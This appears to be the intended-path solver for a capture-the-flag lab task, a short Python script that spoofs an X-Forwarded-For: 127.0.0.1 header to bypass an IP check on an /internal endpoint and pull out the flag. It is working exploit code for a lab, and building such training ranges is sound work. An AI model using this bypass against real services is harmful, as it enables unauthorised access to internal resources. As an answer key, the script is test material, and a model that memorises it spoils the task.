"""Intended-path solver: X-Forwarded-For spoofing."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

HEADERS = {"X-Forwarded-For": "127.0.0.1"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(f"{ctx.url()}/internal", headers=HEADERS, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="xff-spoof",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in response",
            )
        ]
    )
